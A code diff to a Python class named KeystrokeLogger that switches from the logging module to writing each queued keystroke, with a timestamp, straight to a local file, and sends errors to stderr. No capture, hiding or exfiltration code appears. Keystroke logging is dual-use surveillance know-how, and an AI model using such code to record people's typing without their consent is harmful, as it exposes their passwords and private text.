@@ -22,14 +22,8 @@ class KeystrokeLogger:
         # Ensure log directory exists
         os.makedirs(os.path.dirname(os.path.abspath(log_file)) or '.', exist_ok=True)
         
-        # Configure logging
-        logging.basicConfig(
-            filename=log_file, 
-            level=logging.INFO, 
-            format='%(asctime)s - %(message)s',
-            filemode='a'  # Append mode to ensure file creation
-        )
-        self.logger = logging.getLogger(__name__)
+        # Store log file path
+        self.log_file = log_file
         
         # Queue to manage keystrokes
         self.keystroke_queue = queue.Queue()
@@ -91,8 +85,15 @@ class KeystrokeLogger:
             try:
                 # Use a timeout to allow checking the stop flag
                 key = self.keystroke_queue.get(timeout=0.1)
-                self.logger.info(f"Keystroke: {key}")
+                
+                # Write directly to file
+                with open(self.log_file, 'a') as f:
+                    from datetime import datetime
+                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    f.write(f"{timestamp} - Keystroke: {key}\n")
+                
             except queue.Empty:
                 continue
             except Exception as e:
-                self.logger.error(f"Error logging keystroke: {e}")
+                # Log to stderr if unable to write to file
+                print(f"Error logging keystroke: {e}", file=sys.stderr)
